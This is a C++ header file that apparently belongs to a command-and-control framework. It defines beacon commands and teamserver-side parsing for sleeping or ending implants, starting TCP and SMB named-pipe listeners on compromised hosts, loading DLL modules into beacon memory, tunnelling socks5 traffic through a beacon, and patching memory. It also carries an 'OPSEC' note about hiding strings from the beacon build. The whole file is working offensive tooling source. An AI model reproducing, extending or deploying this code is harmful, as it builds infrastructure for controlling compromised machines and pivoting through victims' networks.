#pragma once

#include <string>
#include <vector>
#include <random>

#include "ModuleCmd.hpp"


#define ERROR_GENERIC 10000
#define ERROR_LISTENER_EXIST 10001
#define ERROR_PORT_FORMAT 10002
#define ERROR_HASH_NOT_FOUND 10003
#define ERROR_LOAD_LIBRARY 10004
#define ERROR_GET_PROC_ADDRESS 10005
#define ERROR_MODULE_NOT_FOUND 10006


// TODO set an enum
const std::string ListenerHttpType = "http";
const std::string ListenerHttpsType = "https";
const std::string ListenerTcpType = "tcp";
const std::string ListenerSmbType = "smb";
const std::string ListenerGithubType = "github";
const std::string ListenerDnsType = "dns";


// should only be use by the listener and beacon to communicate, could take any values
const std::string SleepCmd = "SL";
const std::string ListenerCmd = "LIS";
const std::string ListenerPollCmd = "LISP";
const std::string LoadC2ModuleCmd = "LM";
const std::string UnloadC2ModuleCmd = "ULM";
const std::string Socks5Cmd = "SO5";
const std::string GetInfoCmd = "GI";
const std::string PatchMemoryCmd = "PM";
const std::string InitCmd = "IN";
const std::string RunCmd = "RU";
const std::string EndCmd = "EN";
const std::string StartCmd = "STA";
const std::string StopCmd = "STO";

const std::string CmdStatusSuccess = "Success";
const std::string CmdStatusFail = "Fail";


#ifdef BUILD_TEAMSERVER

const std::string SleepInstructionString = "sleep";
const std::string EndInstructionString = "end";
const std::string ListenerInstructionString = "listener";
const std::string LoadModuleInstructionString = "loadModule";
const std::string UnloadModuleInstructionString = "unloadModule";
const std::string SocksInstructionString = "socks";
const std::string GetInfoInstructionString = "getInfo";
const std::string PatchMemoryInstructionString = "patchMemory";

class CommonCommands
{
	public:
	CommonCommands()
	{
		m_commonCommands.push_back(SleepInstructionString);
		m_commonCommands.push_back(EndInstructionString);
		m_commonCommands.push_back(ListenerInstructionString);
		m_commonCommands.push_back(LoadModuleInstructionString);
		m_commonCommands.push_back(UnloadModuleInstructionString);
		m_commonCommands.push_back(SocksInstructionString);
		m_commonCommands.push_back(GetInfoInstructionString);
		m_commonCommands.push_back(PatchMemoryInstructionString);
	}

	int getNumberOfCommand()
	{
		return m_commonCommands.size();
	}

	std::string getCommand(int idx)
	{
		if(idx<m_commonCommands.size())
			return m_commonCommands[idx];
		else 
			return "";
	}

	std::string getHelp(std::string cmd)
	{
		// OPSEC remove getHelp and getInfo strings from the beacon compilation
		std::string output;

		if(cmd==SleepCmd)
		{
			output = "sleep: \n";
			output += "Set the sleep time in sec for the beacon.\n";
			output += "exemple:\n";
			output += " - sleep 1\n";
		}
		else if(cmd==EndCmd)
		{
			output = "end: \n";
			output += "Stop the beacon.\n";
			output += "exemple:\n";
			output += " - end\n";
		}
		else if(cmd==ListenerCmd)
		{
			output = "listener: \n";
			output += "Start a tcp or smb listener on the beacon.\n";
			output += "exemple:\n";
			output += " - listener start tcp 0.0.0.0 4444\n";
			output += " - listener start smb pipename\n";
			output += " - listener stop uAgXVQny0o1GVoIHf0Jaed4xl5lYpHKU\n";
		}
		else if(cmd==LoadC2ModuleCmd)
		{
			output = "loadModule: \n";
			output += "Load module DLL file on the memory of the beacon, giving the beacon this capability.\n";
			output += "Load the DLL from the given path, if it's not found try the default ../Modules/ path.";
			output += "exemple:\n";
			output += " - loadModule /tools/PrintWorkingDirectory.dll \n";
		}
		else if(cmd==UnloadC2ModuleCmd)
		{
			output = "unloadModule: \n";
			output += "Unload module DLL loaded by loadModule.\n";
			output += "exemple:\n";
			output += " - unloadModule assemblyExec \n";
		}
		else if(cmd==Socks5Cmd)
		{
			output = "socks: \n";
			output += "Start a socks5 server on the TeamServer and tunnel the traffic to the Beacon.\n";
			output += "The tunneling is done using the communication protocol of the beacon.\n";
			output += "Only one socks5 server can be opened at a time.\n";
			output += "exemple:\n";
			output += " - socks start 1080 \n";
			output += " - socks stop \n";
		}
		else if(cmd==GetInfoCmd)
		{
			output = "getInfo: \n";
			output += "TODO\n";
		}
		else if(cmd==PatchMemoryCmd)
		{
			output = "patchMemory: \n";
			output += "TODO\n";
		}

		return output;
	}

	// if an error ocurre:
	// set_returnvalue(errorMsg) && return -1
	int init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
	{
		std::string instruction = splitedCmd[0];

		//
		// Sleep
		//
		if(instruction==SleepInstructionString)
		{
			if(splitedCmd.size()==2)
			{
				float sleepTimeSec=5;
				try 
				{
					sleepTimeSec = atof(splitedCmd[1].c_str());
				}
				catch (const std::invalid_argument& ia) 
				{
					std::cerr << "Invalid argument: " << ia.what() << '\n';
					return -1;
				}
				c2Message.set_instruction(SleepCmd);
				c2Message.set_cmd(std::to_string(sleepTimeSec));	
			}
			else
			{
				std::string errorMsg = getHelp(SleepCmd);
				c2Message.set_returnvalue(errorMsg);
				return -1;
			}
		}
		//
		// End
		//
		else if(instruction==EndInstructionString)
		{
			c2Message.set_instruction(EndCmd);
			c2Message.set_cmd("");	
		}
		//
		// Listener
		//
		else if(instruction==ListenerInstructionString)
		{
			if(splitedCmd.size()>=3)
			{
				if(splitedCmd[1]==StartCmd && splitedCmd[2]==ListenerTcpType)
				{
					if(splitedCmd.size()>=5)
					{
						std::string host = splitedCmd[3];
						int port=-1;
						try 
						{
							port = std::atoi(splitedCmd[4].c_str());
						}
						catch (const std::invalid_argument& ia) 
						{
							std::cerr << "Invalid argument: " << ia.what() << '\n';
							return -1;
						}

						std::string cmd = StartCmd;
						cmd+=" ";
						cmd+=ListenerTcpType;
						cmd+=" ";
						cmd+=host;
						cmd+=" ";
						cmd+=std::to_string(port);
						c2Message.set_instruction(ListenerCmd);
						c2Message.set_cmd(cmd);	
					}
					else
					{
						std::string errorMsg = "listener start: not enough arguments";
						c2Message.set_returnvalue(errorMsg);	
						return -1;
					}
				}
				else if(splitedCmd[1]==StartCmd && splitedCmd[2]==ListenerSmbType)
				{
					if(splitedCmd.size()>=4)
					{
						std::string pipeName = splitedCmd[3];
						std::string cmd = StartCmd;
						cmd+=" ";
						cmd+=ListenerSmbType;
						cmd+=" ";
						cmd+=pipeName;
						c2Message.set_instruction(ListenerCmd);
						c2Message.set_cmd(cmd);	
					}
					else
					{
						std::string errorMsg = "listener start: not enough arguments";
						c2Message.set_returnvalue(errorMsg);	
						return -1;
					}
				}
				else if(splitedCmd[1]==StopCmd)
				{
					std::string hash = splitedCmd[2];
					std::string cmd = StopCmd;
					cmd+=" ";
					cmd+=hash;
					c2Message.set_instruction(ListenerCmd);
					c2Message.set_cmd(cmd);	
				}				
			}
			else
			{
				std::string errorMsg = getHelp(ListenerCmd);
				c2Message.set_returnvalue(errorMsg);
				return -1;
			}
		}
		//
		// Load Memory Module
		//
		else if(instruction==LoadModuleInstructionString)
		{
			if (splitedCmd.size() == 2)
			{
				std::string inputFile = splitedCmd[1];
				
				std::ifstream input;
				input.open(inputFile, std::ios::binary);
				if(!input)
				{
					std::string newInputFile = m_linuxModulesDirectoryPath;
					newInputFile+=inputFile;
					input.open(newInputFile, std::ios::binary);
				}
				if(!input)
				{
					std::string newInputFile = m_windowsModulesDirectoryPath;
					newInputFile+=inputFile;
					input.open(newInputFile, std::ios::binary);
				}

				if( input ) 
				{
					std::string buffer(std::istreambuf_iterator<char>(input), {});

					c2Message.set_instruction(LoadC2ModuleCmd);
					c2Message.set_inputfile(inputFile);
					c2Message.set_data(buffer.data(), buffer.size());
				}
				else
				{
					c2Message.set_returnvalue("Failed: Couldn't open file.");
					return -1;
				}
			}
			else
			{
				std::string errorMsg = getHelp(LoadC2ModuleCmd);
				c2Message.set_returnvalue(errorMsg);
				return -1;
			}
		}
		else if(instruction==UnloadModuleInstructionString)
		{
			if (splitedCmd.size() == 2)
			{
				std::string moduleName = splitedCmd[1];

				c2Message.set_instruction(UnloadC2ModuleCmd);
				c2Message.set_cmd(moduleName);
			}
			else
			{
				std::string errorMsg = getHelp(UnloadC2ModuleCmd);
				c2Message.set_returnvalue(errorMsg);
				return -1;
			}
		}
		//
		// Socks5
		//
		else if(instruction==SocksInstructionString)
		{
			if(splitedCmd.size()>=2)
			{
				if(splitedCmd[1]==StartCmd)
				{
					if(splitedCmd.size()>=3)
					{
						int port=-1;
						try 
						{
							port = std::atoi(splitedCmd[2].c_str());
						}
						catch (const std::invalid_argument& ia) 
						{
							std::cerr << "Invalid argument: " << ia.what() << '\n';
							return -1;
						}

						c2Message.set_instruction(Socks5Cmd);
						c2Message.set_cmd(StartCmd);
						c2Message.set_data(splitedCmd[2].data(), splitedCmd[2].size());	
					}
					else
					{
						std::string errorMsg = "socks start: not enough arguments";
						c2Message.set_returnvalue(errorMsg);	
						return -1;
					}
				}
				else if(splitedCmd[1]==StopCmd)
				{
					c2Message.set_instruction(Socks5Cmd);
					c2Message.set_cmd(StopCmd);	
				}		
				else
				{
					std::string errorMsg = getHelp(Socks5Cmd);
					c2Message.set_returnvalue(errorMsg);
					return -1;
				}

			}
			else
			{
				std::string errorMsg = getHelp(instruction);
				c2Message.set_returnvalue(errorMsg);
				return -1;
			}
		}
		return 0;
	}


	int errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg) 
	{
		int errorCode = c2RetMessage.errorCode();
		if(errorCode>0)
		{
			if(errorCode==ERROR_GENERIC)
				errorMsg = "Error";
			else if(errorCode==ERROR_LISTENER_EXIST)
				errorMsg = "Error: Listener already exist";
			else if(errorCode==ERROR_PORT_FORMAT)
				errorMsg = "Error: Port format";
			else if(errorCode==ERROR_HASH_NOT_FOUND)
				errorMsg = "Error: Hash not found";
			else if(errorCode==ERROR_LOAD_LIBRARY)
				errorMsg = "Error: MemoryLoadLibrary";
			else if(errorCode==ERROR_GET_PROC_ADDRESS)
				errorMsg = "Error: MemoryGetProcAddress";
			else if(errorCode==ERROR_MODULE_NOT_FOUND)
				errorMsg = "Error: Module not found";
		}
		return 0;
	}

	int setDirectories( const std::string& teamServerModulesDirectoryPath,
						const std::string& linuxModulesDirectoryPath,
						const std::string& windowsModulesDirectoryPath,
						const std::string& linuxBeaconsDirectoryPath,
						const std::string& windowsBeaconsDirectoryPath,
						const std::string& toolsDirectoryPath,
						const std::string& scriptsDirectoryPath)
	{
		m_teamServerModulesDirectoryPath=teamServerModulesDirectoryPath;
		m_linuxModulesDirectoryPath=linuxModulesDirectoryPath;
		m_windowsModulesDirectoryPath=windowsModulesDirectoryPath;
		m_linuxBeaconsDirectoryPath=linuxBeaconsDirectoryPath;
		m_windowsBeaconsDirectoryPath=windowsBeaconsDirectoryPath;
		m_toolsDirectoryPath=toolsDirectoryPath;
		m_scriptsDirectoryPath=scriptsDirectoryPath;

		return 0;
	};

private:
	std::vector<std::string> m_commonCommands;

	std::string m_teamServerModulesDirectoryPath;
    std::string m_linuxModulesDirectoryPath;
    std::string m_windowsModulesDirectoryPath;
    std::string m_linuxBeaconsDirectoryPath;
    std::string m_windowsBeaconsDirectoryPath;
    std::string m_toolsDirectoryPath;
    std::string m_scriptsDirectoryPath;
};


#endif
